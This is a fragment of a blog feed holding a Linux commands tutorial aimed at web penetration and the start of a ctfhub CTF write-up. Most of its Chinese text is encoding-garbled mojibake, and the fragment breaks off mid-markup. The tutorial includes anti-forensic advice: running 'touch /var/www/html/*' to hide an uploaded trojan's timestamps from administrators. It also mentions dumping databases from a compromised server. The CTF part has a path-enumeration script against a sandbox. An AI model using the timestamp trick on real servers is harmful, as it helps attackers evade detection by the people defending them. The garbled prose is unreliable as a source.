        <content type="html"><![CDATA[<p>Linuxå‘½ä»¤æ˜¯ç”¨äºå®ç°æŸä¸€ç±»åŠŸèƒ½çš„æŒ‡ä»¤æˆ–è€…ç¨‹åºï¼Œå…¶å‘½ä»¤çš„æ‰§è¡Œä¾èµ–äºè§£é‡Šå™¨ç¨‹åºï¼Œå¦‚bin/bashã€‚</p><p><code>å†…éƒ¨å‘½ä»¤ï¼šå®‰è£…ç³»ç»Ÿèƒ½æ‰§è¡Œçš„å‘½ä»¤ï¼Œshellè§£æå™¨éƒ¨åˆ†ï¼Œæ¯”å¦‚lsã€catã€cdã€‚</code></p><p><code>å¤–éƒ¨å‘½ä»¤ï¼šå®‰è£…webåº”ç”¨ç¨‹åºçš„å‘½ä»¤ï¼Œå¤§éƒ¨åˆ†æ—¶å¯¹å®‰è£…ç¨‹åºè¿›è¡Œæ“ä½œçš„ã€‚</code></p><h3 id="Linuxå‘½ä»¤çš„é€šç”¨æ ¼å¼ä¸ºï¼š"><a href="#Linuxå‘½ä»¤çš„é€šç”¨æ ¼å¼ä¸ºï¼š" class="headerlink" title="Linuxå‘½ä»¤çš„é€šç”¨æ ¼å¼ä¸ºï¼š"></a>Linuxå‘½ä»¤çš„é€šç”¨æ ¼å¼ä¸ºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤å…³é”®å­—[é€‰é¡¹] [å‚æ•°]</span><br><span class="line">é€‰é¡¹åŠå‚æ•°å«ä¹‰ï¼š</span><br><span class="line">   -é€‰é¡¹ï¼šç”¨äºè°ƒèŠ‚å‘½ä»¤çš„å…·ä½“åŠŸèƒ½</span><br><span class="line">   -ä»¥â€œ-â€å¼•å¯¼çŸ­æ ¼å¼é€‰é¡¹ï¼ˆå•ä¸ªå­—ç¬¦ï¼‰ï¼Œæ¯”å¦‚â€œ-lâ€</span><br><span class="line">   -ä»¥â€œ--â€å¼•å¯¼é•¿æ ¼å¼é€‰é¡¹ï¼ˆå¤šä¸ªå­—ç¬¦ï¼‰ï¼Œæ¯”å¦‚â€œ--colorâ€</span><br><span class="line">   -å¤šä¸ªæ®µæ ¼å¼é€‰é¡¹å¯ä»¥å†™åœ¨ä¸€èµ·ï¼Œç”¨ä¸€ä¸ªâ€œ-â€å¼•å¯¼ï¼Œæ¯”å¦‚â€œ-alâ€</span><br><span class="line">å‚æ•°ï¼šå‘½ä»¤æ“ä½œçš„å¯¹è±¡ï¼Œå¦‚æ–‡ä»¶ã€ç›®å½•åç­‰</span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹å­ï¼Œ<code>ls -al /home</code>æŸ¥çœ‹homeç›®å½•ä¿¡æ¯ã€‚</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715152508816.png" alt="image-20230715152508816"></p><h3 id="Linuxå‘½ä»¤è¡Œç¼–è¾‘çš„å‡ ä¸ªè¾…åŠ©æ“ä½œåŒ…æ‹¬ï¼š"><a href="#Linuxå‘½ä»¤è¡Œç¼–è¾‘çš„å‡ ä¸ªè¾…åŠ©æ“ä½œåŒ…æ‹¬ï¼š" class="headerlink" title="Linuxå‘½ä»¤è¡Œç¼–è¾‘çš„å‡ ä¸ªè¾…åŠ©æ“ä½œåŒ…æ‹¬ï¼š"></a>Linuxå‘½ä»¤è¡Œç¼–è¾‘çš„å‡ ä¸ªè¾…åŠ©æ“ä½œåŒ…æ‹¬ï¼š</h3><p>tabé”®ï¼šè‡ªåŠ¨è¡¥å…¨</p><p>åæ–œæ â€œ \â€:å¼ºåˆ¶æ¢è¡Œ</p><p>å¿«æ·é”®ctrl + Uï¼šæ¸…ç©ºè‡³è¡Œé¦–</p><p>å¿«æ·é”®ctrl + K ï¼šæ¸…ç©ºè‡³è¡Œå°¾</p><p>å¿«æ·é”®ctrl + L ï¼šæ¸…å±ï¼Œç±»ä¼¼äºclear</p><p>å¿«æ·é”®ctrl + Cï¼šå–æ¶ˆæœ¬æ¬¡å‘½ä»¤ç¼–è¾‘ï¼Œå¼ºåˆ¶ä¸­æ–­ç¨‹åºçš„æ‰§è¡Œ</p><p>å¿«æ·é”®ctrl + Z ï¼šå¼ºåˆ¶ä¸­æ–­ä»»åŠ¡</p><h3 id="å¸¸è§çš„Linuxå‘½ä»¤"><a href="#å¸¸è§çš„Linuxå‘½ä»¤" class="headerlink" title="å¸¸è§çš„Linuxå‘½ä»¤"></a>å¸¸è§çš„Linuxå‘½ä»¤</h3><h4 id="å‘½ä»¤ï¼šhelp"><a href="#å‘½ä»¤ï¼šhelp" class="headerlink" title="å‘½ä»¤ï¼šhelp"></a>å‘½ä»¤ï¼šhelp</h4><p>Linuxå†…éƒ¨å¸®åŠ©å‘½ä»¤æ˜¯helpï¼Œå…¶åŸºæœ¬ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>help</li></ul><p>æŸ¥çœ‹Bashå†…éƒ¨å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯</p><ul><li>å‘½ä»¤ â€“help</li></ul><p>æŸ¥çœ‹å¤–éƒ¨å‘½ä»¤å¸®åŠ©ä¿¡æ¯ï¼Œé€‚åˆå¤§å¤šæ•°å¤–éƒ¨å‘½ä»¤</p><ul><li>ä½¿ç”¨manå‘½ä»¤é˜…è¯»æ‰‹å†Œé¡µ</li></ul><p>ä½¿ç”¨â€œâ†‘â€ã€â€œâ†“â€æ–¹å‘é”®æ»šåŠ¨æ–‡æœ¬ï¼Œä½¿ç”¨Page Upå’ŒPage Downé”®ç¿»é¡µï¼ŒæŒ‰Qæˆ–qé”®é€€å‡ºé˜…è¯»ç¯å¢ƒï¼ŒæŒ‰â€œ/â€é”®åæŸ¥çœ‹å†…å®¹</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155028075.png" alt="image-20230715155028075"></p><h4 id="å‘½ä»¤ï¼šuname"><a href="#å‘½ä»¤ï¼šuname" class="headerlink" title="å‘½ä»¤ï¼šuname"></a>å‘½ä»¤ï¼šuname</h4><p>æŸ¥çœ‹ç³»ç»Ÿç›¸å…³ä¿¡æ¯ï¼Œå¸¸è§å‘½ä»¤é€‰é¡¹ï¼š</p><p>-a ï¼šæ˜¾ç¤ºä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ã€ç¡¬ä»¶å¹³å°ç­‰è¯¦ç»†ä¿¡æ¯</p><p>-r ï¼š æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬å·</p><p><code>ææƒä¸­å¯èƒ½ä¼šç¢°åˆ°unameå‘½ä»¤ã€‚ææƒä¸€èˆ¬åŸºäºå†…æ ¸çš„æœ¬åœ°æº¢å‡ºææƒï¼Œå¦‚æœæƒ³æœ¬åœ°æº¢å‡ºï¼Œé¦–å…ˆéœ€è¦çœ‹åˆ°æœ¬åœ°ç‰ˆæœ¬å·</code></p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155950449.png" alt="image-20230715155950449"></p><h4 id="å‘½ä»¤ï¼šhostname"><a href="#å‘½ä»¤ï¼šhostname" class="headerlink" title="å‘½ä»¤ï¼šhostname"></a>å‘½ä»¤ï¼šhostname</h4><p>æŸ¥çœ‹ç³»ç»Ÿä¸»æœºåï¼ŒåŒ…æ‹¬ä¸»æœºåç§°ï¼Œæ‰€åœ¨åŸŸçš„åç§°</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160722996.png" alt="image-20230715160722996"></p><h4 id="å‘½ä»¤ï¼šifconfig"><a href="#å‘½ä»¤ï¼šifconfig" class="headerlink" title="å‘½ä»¤ï¼šifconfig"></a><strong>å‘½ä»¤ï¼šifconfig</strong></h4><p>æŸ¥çœ‹ç³»ç»ŸIPä¿¡æ¯</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160820826.png" alt="image-20230715160820826"></p><h4 id="å‘½ä»¤ï¼šcat-proc-cpuinfo"><a href="#å‘½ä»¤ï¼šcat-proc-cpuinfo" class="headerlink" title="å‘½ä»¤ï¼šcat  /proc/cpuinfo"></a>å‘½ä»¤ï¼š<strong>cat  /proc/cpuinfo</strong></h4><p>æŸ¥çœ‹CPUä¿¡æ¯</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161430568.png" alt="image-20230715161430568"></p><h4 id="å‘½ä»¤ï¼šcat-proc-meminfo"><a href="#å‘½ä»¤ï¼šcat-proc-meminfo" class="headerlink" title="å‘½ä»¤ï¼šcat  /proc/meminfo"></a>å‘½ä»¤ï¼šcat  /proc/meminfo</h4><p>æŸ¥çœ‹å†…å­˜ä¿¡æ¯</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161559159.png" alt="image-20230715161559159"></p><h3 id="ç›®å½•æ“ä½œå‘½ä»¤-ls-cd-du-mkdir"><a href="#ç›®å½•æ“ä½œå‘½ä»¤-ls-cd-du-mkdir" class="headerlink" title="ç›®å½•æ“ä½œå‘½ä»¤ ls/cd/du/mkdir"></a>ç›®å½•æ“ä½œå‘½ä»¤ ls/cd/du/mkdir</h3><h4 id="å‘½ä»¤ï¼špwd"><a href="#å‘½ä»¤ï¼špwd" class="headerlink" title="å‘½ä»¤ï¼špwd"></a>å‘½ä»¤ï¼špwd</h4><p>æŸ¥çœ‹ç›®å½•å·¥å…·</p><h4 id="å‘½ä»¤ï¼šcd"><a href="#å‘½ä»¤ï¼šcd" class="headerlink" title="å‘½ä»¤ï¼šcd"></a>å‘½ä»¤ï¼šcd</h4><p>åˆ‡æ¢å·¥ä½œç›®å½•ï¼Œå…¶æ ¼å¼ä¸ºï¼šcd [ç›®å½•ä½ç½®]</p><p>ç›¸å¯¹è·¯å¾„</p><p>ç»å¯¹è·¯å¾„</p><h4 id="å‘½ä»¤ï¼šls"><a href="#å‘½ä»¤ï¼šls" class="headerlink" title="å‘½ä»¤ï¼šls"></a>å‘½ä»¤ï¼šls</h4><p>ç”¨é€”ï¼šåˆ—è¡¨æ˜¾ç¤ºç›®å½•å†…å®¹</p><p>ls [ç›®å½•æˆ–æ–‡ä»¶å]</p><ul><li>-lï¼šä»¥é•¿æ ¼å¼æ˜¾ç¤º</li><li>-aï¼šæ˜¾ç¤ºæ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶</li><li>-Aï¼šç±»ä¼¼äºâ€œ-aâ€ï¼Œä½†ä¸æ˜¾ç¤ºâ€œ.â€å’Œâ€œâ€¦â€ç›®å½•çš„ä¿¡æ¯</li><li>-dï¼šæ˜¾ç¤ºç›®å½•æœ¬èº«çš„å±æ€§</li><li>-hï¼šä»¥æ›´æ˜“è¯»çš„å­—èŠ‚å•ä½ï¼ˆKã€Mç­‰ï¼‰æ˜¾ç¤ºä¿¡æ¯</li><li>-Rï¼šé€’å½’æ˜¾ç¤ºå†…å®¹</li><li>â€“colorï¼šä»¥é¢œè‰²åŒºåˆ†ä¸åŒç±»å‹æ–‡ä»¶</li></ul><h4 id="å¸¸ç”¨ç»„åˆï¼šls-al"><a href="#å¸¸ç”¨ç»„åˆï¼šls-al" class="headerlink" title="å¸¸ç”¨ç»„åˆï¼šls -al"></a>å¸¸ç”¨ç»„åˆï¼šls -al</h4><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œlsç›¸å½“äºDOSå‘½ä»¤ä¸­çš„dirï¼ŒLinuxçš„éšè—æ–‡ä»¶å‰é¢æœ‰ä¸ªç‚¹â€œ .testâ€ ,å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">ls /</span><br><span class="line">æŸ¥çœ‹æ ¹ç›®å½•æˆ–è€…æ–‡ä»¶</span><br><span class="line">ls -al</span><br><span class="line">æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Œå¹¶ä»¥é•¿æ ¼å¼æ˜¾ç¤º</span><br><span class="line">ls -lh /</span><br><span class="line">æŸ¥çœ‹æ–‡ä»¶å¤§å°ï¼Œä»¥é•¿æ ¼å¼æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p>åœ¨webæ¸—é€ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨â€œls  -alâ€å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶çš„æƒé™ä¿¡æ¯ã€‚</p><h4 id="å‘½ä»¤ï¼šdu"><a href="#å‘½ä»¤ï¼šdu" class="headerlink" title="å‘½ä»¤ï¼šdu"></a>å‘½ä»¤ï¼šdu</h4><p>ç”¨é€”ï¼šä¸»è¦ç”¨äºæŸ¥çœ‹æ–‡ä»¶å¤§å°ï¼Œç»Ÿè®¡ç›®å½•åŠæ–‡ä»¶çš„ç©ºé—´å ç”¨æƒ…å†µï¼ˆEatimate file space usageï¼‰ã€‚</p><p>æ ¼å¼ï¼šdu [é€‰é¡¹]â€¦ [ç›®å½•æˆ–æ–‡ä»¶å]</p><p>å¸¸ç”¨æ ¼å¼é€‰é¡¹ï¼š</p><ul><li>-aï¼šç»Ÿè®¡æ—¶åŒ…æ‹¬æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…åªç»Ÿè®¡ç›®å½•</li><li>-hï¼šä»¥æ›´æ˜“è¯»çš„å­—èŠ‚å•ä½ï¼ˆKã€Mç­‰ï¼‰æ˜¾ç¤ºä¿¡æ¯</li><li>-sï¼šåªç»Ÿè®¡æ¯ä¸ªå‚æ•°æ‰€å ç”¨ç©ºé—´æ€»çš„å¤§å°</li></ul><h5 id="å¸¸ç”¨ç»„åˆï¼šdu-sh"><a href="#å¸¸ç”¨ç»„åˆï¼šdu-sh" class="headerlink" title="å¸¸ç”¨ç»„åˆï¼šdu -sh"></a>å¸¸ç”¨ç»„åˆï¼šdu -sh</h5><p>å½“æˆ‘ä»¬æ‹¿åˆ°æœåŠ¡å™¨ä¹‹åï¼Œéœ€è¦å¯¹æºç è¿›è¡Œæ‰“åŒ…æˆ–æ•°æ®åº“è¿›è¡Œè„±åº“ï¼Œå¦‚æœåº“å¤ªå¤§ï¼ŒSqlmapå¯èƒ½ä¼šè·‘å´©ï¼Œå¯ä»¥å°è¯•duæŸ¥çœ‹å¤§å°â€œdu -sh /â€ï¼Œå†ç”¨â€œgzipâ€å‹ç¼©æ‰“åŒ…ä¸‹è½½</p><h4 id="å‘½ä»¤ï¼šmkdir"><a href="#å‘½ä»¤ï¼šmkdir" class="headerlink" title="å‘½ä»¤ï¼šmkdir"></a>å‘½ä»¤ï¼šmkdir</h4><p>ç”¨é€”ï¼šå¸¸è§å‘½ä»¤ï¼Œç”¨äºåˆ›å»ºæ–°çš„ç›®å½•</p><p>æ ¼å¼ï¼šmkdir [-p] [/è·¯å¾„]ç›®å½•å</p><p>å¸¸ç”¨å‘½ä»¤ï¼šé€’å½’åˆ›å»ºç›®å½•mkdir -p /csdn/eastmount</p><p>å½“æˆ‘ä»¬è°ƒç”¨â€œmkdir  /cdsn/eastmount â€æ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºè·Ÿç›®å½•ä¸‹æ²¡æœ‰â€œcsdnâ€ç›®å½•ã€‚å¦‚æœæƒ³è¦è¿ç»­é€’å½’åˆ›å»ºå¤šä¸ªç›®å½•ï¼Œåˆ™éœ€è¦å¢åŠ â€œ-pâ€å‚æ•°ï¼Œå³â€œmkdir -p</p><p>/csdn/eastmountâ€</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225441390.png" alt="image-20230715225441390"></p><p>å¦‚æœæƒ³è¦è¿ç»­åˆ›å»ºä¸¤ä¸ªç›®å½•ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225556094.png" alt="image-20230715225556094"></p><h3 id="æ–‡ä»¶æ“ä½œå‘½ä»¤touch-vim-cp-rm-mv-find"><a href="#æ–‡ä»¶æ“ä½œå‘½ä»¤touch-vim-cp-rm-mv-find" class="headerlink" title="æ–‡ä»¶æ“ä½œå‘½ä»¤touch/vim/cp/rm/mv/find"></a>æ–‡ä»¶æ“ä½œå‘½ä»¤touch/vim/cp/rm/mv/find</h3><h4 id="å‘½ä»¤ï¼štouch"><a href="#å‘½ä»¤ï¼štouch" class="headerlink" title="å‘½ä»¤ï¼štouch"></a>å‘½ä»¤ï¼štouch</h4><p>ç”¨é€”ï¼šæ–°å»ºç©ºæ–‡ä»¶ï¼Œæˆ–æ›´æ–°æ–‡ä»¶æ—¶é—´æ ‡è®°</p><p>æ ¼å¼ï¼štouch æ–‡ä»¶å</p><p>å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œè¯¥å‘½ä»¤çš„å¦ä¸€ä¸ªä½œç”¨æ˜¯æ›´æ–°æ—¥æœŸã€‚åœ¨webæ¸—é€ä¸­ï¼Œè¯¥å‘½ä»¤å¯ä»¥ç¡¬æ ¸çš„å¸®åŠ©æˆ‘ä»¬åˆ›å»ºæ–‡ä»¶æˆ–éšè—ä¸œè¥¿ã€‚æ¯”å¦‚æˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå®ƒä¼šæœ‰ç›¸åº”çš„æ–°å»ºæ—¥æœŸï¼Œç®¡ç†å‘˜å¾ˆå®¹æ˜“å‘ç°è¿™äº›å¼‚å¸¸æ–‡ä»¶æˆ–ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•å°†æ‰€æœ‰æ–‡ä»¶éƒ½æ›´æ–°åˆ°æœ€æ–°æ—¥æœŸï¼Œè°ƒç”¨â€œtouch /var/www/html/*â€å‘½ä»¤å®ç°ï¼Œä½†å…¶æ•ˆæœè‚¯å®šä¸å¥½ï¼Œåé¢éšç€æ·±å…¥ï¼Œä¼šåˆ†äº«æ›´å¥½çš„æ–¹æ³•</p><p>   <img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231549659.png" alt="image-20230715231549659">        </p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231810225.png" alt="image-20230715231810225"></p><h4 id="å‘½ä»¤ï¼šln"><a href="#å‘½ä»¤ï¼šln" class="headerlink" title="å‘½ä»¤ï¼šln"></a>å‘½ä»¤ï¼šln</h4><p>ç”¨é€”ï¼šä¸ºæ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºé“¾æ¥ï¼Œå³å¿«æ·æ–¹å¼</p><p>æ ¼å¼ï¼šln [-s]æºæ–‡ä»¶æˆ–ç›®å½•..é“¾æ¥æ–‡ä»¶æˆ–ç›®æ ‡ç›®å½•</p><p>å¸¸ç”¨æ ¼å¼é€‰é¡¹ï¼š</p><p>-sï¼šå»ºç«‹ç¬¦å·é“¾æ¥æ–‡ä»¶</p><h4 id="å‘½ä»¤ï¼šcp"><a href="#å‘½ä»¤ï¼šcp" class="headerlink" title="å‘½ä»¤ï¼šcp"></a>å‘½ä»¤ï¼šcp</h4><p>ç”¨é€”ï¼šå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</p><p>æ ¼å¼ï¼šcp [é€‰é¡¹] â€¦æºæ–‡ä»¶ç›®å½•æˆ–ç›®å½•  ç›®å½•æ–‡ä»¶æˆ–ç›®æ ‡ç›®å½•</p><p>å¸¸ç”¨æ ¼å¼é€‰é¡¹ï¼š</p><p>-rï¼šé€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•æ ‘</p><p>-pï¼šä¿æŒæºæ–‡ä»¶çš„å±æ€§ä¸å˜</p><p>-fï¼šå¼ºåˆ¶è¦†ç›–ç›®æ ‡åŒåæ–‡ä»¶æˆ–ç›®å½•,æ ¹ç›®å½•æ˜¯ç•¥è¿‡ç›®å½•æ—¶ä½¿ç”¨ã€‚</p><p>-iï¼šéœ€è¦è¦†ç›–æ–‡ä»¶æˆ–ç›®å½•æ—¶è¿›è¡Œæé†’</p><p>å¤åˆ¶æ–‡ä»¶è‡³æŒ‡å®šä½ç½®ï¼šcp test.txt/var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111138655.png" alt="image-20230716111138655"></p><p>å¦‚æœæˆ‘ä»¬éœ€è¦å¤åˆ¶ç›®å½•çš„è¯ï¼Œéœ€è¦å¢åŠ ä¸€ä¸ªé€’å½’å¤åˆ¶å‚æ•°â€œ-râ€ ï¼Œæ¯”å¦‚ï¼š cp -r cdsn /var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111950239.png" alt="image-20230716111950239"></p><h4 id="å‘½ä»¤ï¼šrm"><a href="#å‘½ä»¤ï¼šrm" class="headerlink" title="å‘½ä»¤ï¼šrm"></a>å‘½ä»¤ï¼šrm</h4><p>ç”¨é€”ï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•</p><p>æ ¼å¼ï¼šrm [é€‰é¡¹] .. æ–‡ä»¶æˆ–ç›®å½•</p><p>å¸¸ç”¨æ ¼å¼é€‰é¡¹ï¼š</p><p>-fï¼šå¼ºåˆ¶åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸è¿›è¡Œæé†’</p><p>-iï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•æ—¶æé†’ç”¨æˆ·ç¡®è®¤</p><p>-r: é€’å½’åˆ é™¤æ•´ä¸ªç›®å½•æ ‘</p><p>å¸¸ç”¨å‘½ä»¤ï¼šé€’å½’å¼ºåˆ¶åˆ é™¤æ•´ä¸ªç›®å½•rm-rfï¼Œä½†éœ€æ…ç”¨</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716113119175.png" alt="image-20230716113119175"></p><h4 id="å‘½ä»¤ï¼šmv"><a href="#å‘½ä»¤ï¼šmv" class="headerlink" title="å‘½ä»¤ï¼šmv"></a>å‘½ä»¤ï¼šmv</h4><p>ç”¨é€”ï¼šç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼Œç›¸å½“äºå‰ªåˆ‡ï¼Œå¦‚æœç›®æ ‡ä½ç½®ä¸æºä½ç½®ç›¸åŒï¼Œç›¸å½“äºé‡å‘½å</p><p>æ ¼å¼ï¼šmv [é€‰é¡¹] â€¦æºæ–‡ä»¶æˆ–ç›®å½•  ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•</p><p>ç§»åŠ¨è‡³â€œcsdnâ€æ–‡ä»¶å¤¹ï¼Œå¦‚ï¼šmv  yl.txt/csdn</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716133231434.png" alt="image-20230716133231434"></p><p>é‡å‘½åæ–‡ä»¶ï¼Œå¦‚ï¼šmv  yl.txt  test.txt</p><h4 id="å‘½ä»¤ï¼šfind"><a href="#å‘½ä»¤ï¼šfind" class="headerlink" title="å‘½ä»¤ï¼šfind"></a>å‘½ä»¤ï¼šfind</h4><p>ç”¨é€”ï¼šç”¨äºæŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•ï¼Œå–è¯ä¹Ÿå¸¸ç”¨è¯¥å‘½ä»¤</p><p>æ ¼å¼ï¼šfind [æŸ¥æ‰¾èŒƒå›´] [æŸ¥æ‰¾æ¡ä»¶]</p><p>å¸¸ç”¨æ ¼å¼é€‰é¡¹ï¼š</p><p>-name: æŒ‰æ–‡ä»¶åç§°æŸ¥æ‰¾</p><p>-sizeï¼šæŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾</p><p> -userï¼šæŒ‰æ–‡ä»¶å±æ€§æŸ¥æ‰¾</p><p>-typeï¼šæŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾</p><p>é€šè¿‡åå­—æŸ¥æŸç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå¦‚ï¼š<code>find  /etc -name  &quot;m*.conf&quot;</code>,æ³¨æ„â€œ*â€è¡¨ç¤ºé€šé…ç¬¦</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716231407108.png" alt="image-20230716231407108"></p><p>æŸ¥æ‰¾ç½‘ç«™æ ¹ç›®å½•ä¸‹å“ªäº›æ–‡ä»¶æ˜¯rootï¼Œå¦‚ï¼šfind / -user root</p><p>åœ¨Webæ¸—é€ä¸­ï¼Œå½“æŸäººä¸Šä¼ æ–‡ä»¶å¹¶ä¿®æ”¹ä¸ºrootæƒé™ï¼Œæˆ‘ä»¬ç®¡ç†å‘˜å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤æŸ¥æ‰¾æ¥å‘ç°å¯ç–‘æ–‡ä»¶ï¼Œåˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦è¢«æ”»å‡»ã€‚</p><p>4.æ–‡æœ¬ç¼–è¾‘æŸ¥çœ‹å‘½ä»¤vim/cat/wc</p><p>å‘½ä»¤ï¼švi</p><p>ç”¨é€”ï¼šè¯¥å‘½ä»¤æ˜¯ä¸€ä¸ªè¾ƒå¤§çš„UNIXå‘½ä»¤</p>]]></content>
      
      
      <categories>
          
          <category> å‘½ä»¤å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub</title>
      <link href="/2023/07/15/ctfhub/"/>
      <url>/2023/07/15/ctfhub/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h1><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><p>1.æœ‰ä¸¤å±‚ç›®å½•ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œä¸€å…±æœ‰4*4ç§å°è¯•æ–¹å¼ï¼Œæ‰¾åˆ°flag.txt</p><p><img src="/2023/07/15/ctfhub/image-20230713092337772.png" alt="image-20230713092337772"></p><p>2.ç”¨pythonè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># è®¿é—®ç›®å½•éå†ï¼Œ/1/1,/1/2ï¼Œï¼Œï¼Œ/4/4ï¼Œè¯»å–å“åº”æœ‰æ— flag.txtï¼Œæœ‰åˆ™è¾“å‡ºç›®å½•è·¯å¾„</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge-df1916128f6a845f.sandbox.ctfhub.com:10800/flag_in_here/&quot;</span><br><span class="line">for i in range(1, 5):</span><br><span class="line">    for j in range(1, 5):</span><br><span class="line">        url1 = url + str(i) + &quot;/&quot; + str(j) + &quot;/flag.txt&quot;</span><br><span class="line">        # è¯»å–å“åº”é¡µé¢ä¸­æœ‰æ— flag.txtï¼Œæœ‰åˆ™æ‰“å°url</span><br><span class="line">        if &quot;ctfhub&#123;&quot; in requests.get(url1).text:</span><br><span class="line">            #ç›´æ¥æ‰“å‡ºflag.txtçš„å†…å®¹</span><br><span class="line">            print(requests.get(url1).text)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><code>ctrl+F æŸ¥æ‰¾å…³é”®å­—flag</code></p><p><img src="/2023/07/15/ctfhub/image-20230713161017017.png" alt="image-20230713161017017"></p><h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç " class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç </h2><p><img src="/2023/07/15/ctfhub/image-20230713161337694.png" alt="image-20230713161337694"></p><p>å¸¸è§çš„ä¸€äº›ç½‘ç«™æºç ä¸‹è½½æ–‡ä»¶åç¼€å’Œæ–‡ä»¶åã€‚</p><p>1.ä½¿ç”¨dirsearshæ‰«æï¼ˆæ–¹æ³•ä¸€ï¼‰</p><figure class="highlight 